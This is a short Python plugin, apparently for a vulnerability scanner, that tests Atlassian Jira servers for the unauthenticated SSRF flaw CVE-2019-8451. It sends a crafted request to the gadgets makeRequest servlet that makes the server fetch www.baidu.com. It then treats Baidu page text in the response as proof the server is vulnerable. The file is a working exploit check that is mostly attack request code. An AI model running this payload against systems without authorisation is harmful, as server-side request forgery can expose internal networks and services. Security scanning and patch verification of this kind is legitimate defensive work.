#!/usr/bin/env python
#coding:utf-8
import requests

def get_plugin_info():
    plugin_info = {
        "info": "Atlassian Jira 未授权SSRF漏洞（CVE-2019-8451），影响范围 Atlassian Jira < 8.4.0",
        "source": 1,
        "name": "Jira未授权SSRF漏洞(CVE-2019-8451)",
        "keyword": "server:web",
        "level": "中危",
        "url": "https://github.com/ianxtianxt/CVE-2019-8451",
        "author": "zinc",
        "type": "SSRF"
    }
    return plugin_info


def check(host, port, timeout):

    target = 'http://%s:%d' % (host, port)
    header = {
        'X-Atlassian-Token': 'no-check',
        'Connection': 'close'
    }

    url = target + '/plugins/servlet/gadgets/makeRequest?url='+target+'@www.baidu.com/'
    html = requests.get(url = url,headers = header)
    if '百度一下' in html.text:
        return True

    return False

if __name__ == '__main__':
    check('127.0.0.1', 8000, 3)